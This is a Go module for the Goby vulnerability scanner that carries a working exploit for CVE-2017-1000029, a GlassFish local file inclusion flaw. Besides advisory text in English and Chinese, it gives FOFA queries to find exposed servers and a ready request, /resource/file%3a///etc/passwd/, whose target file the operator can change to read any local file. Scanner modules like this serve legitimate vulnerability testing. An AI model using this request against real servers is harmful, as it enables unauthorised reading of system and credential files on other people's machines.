package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "GlassFish application server file interface local file inclusion vulnerability (CVE-2017-1000029)",
    "Description": "<p>Oracle GlassFish Server Open Source Edition is an open source version of Oracle's server for building Java EE (server-side Java applications).</p><p>By constructing malicious requests, attackers can read local files on the server, including sensitive information such as system configuration files and log files. This may lead to the leakage of sensitive system information, which in turn leads to an extremely insecure state of the system.</p>",
    "Impact": "<p>Attackers can read local files on the server by constructing malicious requests, including system configuration files, log files and other sensitive information. This may lead to the leakage of sensitive system information, which in turn leads to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.oracle.com/\">http://www.oracle.com/</a></p>",
    "Product": "GlassFish Server Open Source",
    "VulType": [
        "File Inclusion"
    ],
    "Tags": [
        "File Inclusion"
    ],
    "Translation": {
        "CN": {
            "Name": "GlassFish 应用服务器 file 接口本地文件包含漏洞（CVE-2017-1000029）",
            "Product": "GlassFish 应用服务器",
            "Description": "<p>Oracle GlassFish Server Open Source Edition是美国甲骨文（Oracle）公司的一套开源版本的用于构建Java EE（服务器端Java应用程序）的服务器。<br></p><p>攻击者通过构造恶意请求，可以读取服务器上的本地文件，包括系统配置文件、日志文件等敏感信息。这可能导致系统敏感信息泄露，进而导致系统处于极度不安全状态。<br></p>",
            "Recommendation": "<p><span style=\"color: var(--primaryFont-color);\">厂商已发布了漏洞修复程序，请及时关注更新：</span><a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
            "Impact": "<p>攻击者通过构造恶意请求，可以读取服务器上的本地文件，包括系统配置文件、日志文件等敏感信息。这可能导致系统敏感信息泄露，进而导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "文件包含"
            ],
            "Tags": [
                "文件包含"
            ]
        },
        "EN": {
            "Name": "GlassFish application server file interface local file inclusion vulnerability (CVE-2017-1000029)",
            "Product": "GlassFish Server Open Source",
            "Description": "<p>Oracle GlassFish Server Open Source Edition is an open source version of Oracle's server for building Java EE (server-side Java applications).</p><p>By constructing malicious requests, attackers can read local files on the server, including sensitive information such as system configuration files and log files. This may lead to the leakage of sensitive system information, which in turn leads to an extremely insecure state of the system.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"http://www.oracle.com/\">http://www.oracle.com/</a><br></p>",
            "Impact": "<p>Attackers can read local files on the server by constructing malicious requests, including system configuration files, log files and other sensitive information. This may lead to the leakage of sensitive system information, which in turn leads to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "File Inclusion"
            ],
            "Tags": [
                "File Inclusion"
            ]
        }
    },
    "FofaQuery": "((header=\"Server: GlassFish Server\" && body!=\"Server: couchdb\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"server: GlassFish Server\" && banner!=\"couchdb\" && banner!=\"drupal\") || (body=\"webui/jsf\" && body!=\"Server: couchdb\") || (body=\"GlassFish Community\" && body!=\"Server: couchdb\"))",
    "GobyQuery": "((header=\"Server: GlassFish Server\" && body!=\"Server: couchdb\" && header!=\"couchdb\" && header!=\"drupal\") || (banner=\"server: GlassFish Server\" && banner!=\"couchdb\" && banner!=\"drupal\") || (body=\"webui/jsf\" && body!=\"Server: couchdb\") || (body=\"GlassFish Community\" && body!=\"Server: couchdb\"))",
    "Author": "1209319263@qq.com",
    "Homepage": "http://www.oracle.com/",
    "DisclosureDate": "2022-04-05",
    "References": [
        "https://www.trustwave.com/en-us/resources/security-resources/security-advisories/?fid=18784"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2017-1000029"
    ],
    "CNVD": [
        "CNVD-2017-27303"
    ],
    "CNNVD": [
        "CNNVD-201707-830"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/resource/file%3a///etc/passwd/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(.*?):0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/resource/file%3a///etc/passwd/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "regex",
                        "value": "root:(.*?):0:0:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/etc/passwd/",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "CVSSScore": "7.5",
    "PocId": "10360"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
